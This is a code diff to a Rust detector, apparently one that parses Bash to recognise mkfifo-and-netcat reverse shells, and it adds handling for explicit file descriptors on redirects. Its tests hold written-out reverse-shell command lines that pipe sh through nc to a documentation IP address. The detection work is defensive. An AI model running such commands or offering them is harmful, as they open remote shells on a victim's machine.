@@ -53,12 +53,17 @@ fn shell(name: &str) -> bool {
 
 /// Return the requested stream's sole literal path. Other redirects may only
 /// discard stderr; a second redirect or changed descriptor invalidates binding.
-fn redirected<'t, 's>(node: Node<'t>, source: &'s str, stream: u8) -> Option<(Node<'t>, &'s str)> {
+fn redirected<'t, 's>(
+    node: Node<'t>,
+    source: &'s str,
+    stream: u8,
+) -> Option<(Node<'t>, &'s str, Option<Node<'t>>)> {
     if node.kind() != "redirected_statement" {
         return None;
     }
     let body = node.child_by_field_name("body")?;
     let mut path = None;
+    let mut inline_descriptor = None;
     for redirect in children(node).into_iter().filter(|n| *n != body) {
         if redirect.kind() != "file_redirect" {
             return None;
@@ -70,19 +75,32 @@ fn redirected<'t, 's>(node: Node<'t>, source: &'s str, stream: u8) -> Option<(No
             .find(|n| !n.is_named())?;
         let operator = text(operator, source);
         let default = if operator == "<" { 0 } else { 1 };
-        let descriptor =
-            descriptor.map_or(Some(default), |n| text(n, source).parse::<u8>().ok())?;
+        // The Bash grammar can attach an adjacent input descriptor to the
+        // command as a numeric argument (sh 0<path). Whitespace separates a
+        // real argv value (sh 0 <path), which must remain an argument.
+        let adjacent = if descriptor.is_none() && operator == "<" && body.kind() == "command" {
+            children(body)
+                .last()
+                .copied()
+                .filter(|arg| arg.kind() == "number" && arg.end_byte() == redirect.start_byte())
+        } else {
+            None
+        };
+        let descriptor = descriptor
+            .or(adjacent)
+            .map_or(Some(default), |n| text(n, source).parse::<u8>().ok())?;
         if descriptor == stream
             && ((stream == 0 && operator == "<") || (stream == 1 && operator == ">"))
         {
             if path.replace(destination).is_some() {
                 return None;
             }
+            inline_descriptor = adjacent;
         } else if !(descriptor == 2 && operator == ">" && destination == "/dev/null") {
             return None;
         }
     }
-    Some((body, path?))
+    Some((body, path?, inline_descriptor))
 }
 
 fn discard_stderr<'t>(node: Node<'t>, source: &str) -> Option<Node<'t>> {
@@ -138,7 +156,7 @@ fn feedback(body: &str, fifo: &str) -> Option<(String, String, String, u16)> {
     let [output] = nodes.as_slice() else {
         return None;
     };
-    let (pipeline, output_path) = redirected(*output, body, 1)?;
+    let (pipeline, output_path, _) = redirected(*output, body, 1)?;
     if output_path != fifo || pipeline.kind() != "pipeline" {
         return None;
     }
@@ -154,8 +172,11 @@ fn feedback(body: &str, fifo: &str) -> Option<(String, String, String, u16)> {
     if operators != ["|"] {
         return None;
     }
-    let (input, input_path) = redirected(*left, body, 0)?;
-    let (interpreter, args) = command(input, body)?;
+    let (input, input_path, descriptor_arg) = redirected(*left, body, 0)?;
+    let (interpreter, mut args) = command(input, body)?;
+    if let Some(arg) = descriptor_arg {
+        args.retain(|n| *n != arg);
+    }
     if input_path != fifo || !shell(interpreter) || !args.is_empty() {
         return None;
     }
@@ -308,6 +329,8 @@ mod tests {
         assert_eq!(facts(&absolute)[0]["network_client"], "/usr/bin/nc");
         let minimal = "mkfifo /tmp/f; sh -c \"sh </tmp/f | nc 192.0.2.1 8080 >/tmp/f\"";
         assert_eq!(facts(minimal)[0]["fifo"], "/tmp/f");
+        let explicit = SOURCE.replace("sh <", "sh 0<").replace("4444 >", "4444 1>");
+        assert_eq!(facts(&explicit)[0]["fifo"], "/tmp/.x11r");
     }
     #[test]
     fn rejects_broken_paths_directions_non_shells_and_unrelated_commands() {
@@ -317,6 +340,7 @@ mod tests {
             SOURCE.replace(">/tmp/.x11r", ">/tmp/other"),
             SOURCE.replace("sh </tmp/.x11r", "cat </tmp/.x11r"),
             SOURCE.replace("sh </tmp/.x11r", "sh 1</tmp/.x11r"),
+            SOURCE.replace("sh </tmp/.x11r", "sh 0 </tmp/.x11r"),
             SOURCE.replace(">/tmp/.x11r", "2>/tmp/.x11r"),
             SOURCE.replace("sh -c", "echo -c"),
             SOURCE.replace("4444", "0"),
